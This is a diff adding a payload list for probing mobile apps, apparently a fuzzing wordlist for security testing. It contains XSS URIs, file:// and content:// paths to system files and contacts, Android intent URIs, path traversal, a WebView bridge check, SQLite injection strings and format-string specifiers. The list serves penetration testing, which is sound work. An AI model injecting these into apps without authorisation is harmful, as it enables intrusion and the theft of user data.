@@ -1,0 +1,21 @@
+## Mobile-specific probes: deep links / intents / URL schemes / WebView bridges / local SQLite storage.
+## Type them into text fields, deep-link parameters, QR/URL inputs and WebView-backed screens.
+javascript:alert(document.domain)
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+file:///etc/hosts
+file:///data/data/
+content://settings/secure
+content://com.android.contacts/contacts
+intent:#Intent;action=android.intent.action.VIEW;end
+intent://example.com#Intent;scheme=https;package=com.android.chrome;end
+tel:*#06#
+sms:+10000000000?body=injected
+app://../../../
+myapp://admin?token=1
+<script>if(window.Android||window.webkit){alert('native bridge exposed')}</script>
+' OR 1=1; --
+'; PRAGMA table_info(sqlite_master);--
+' UNION SELECT name FROM sqlite_master--
+%s%s%s%s%n
+%x%x%x%x
+../../shared_prefs/
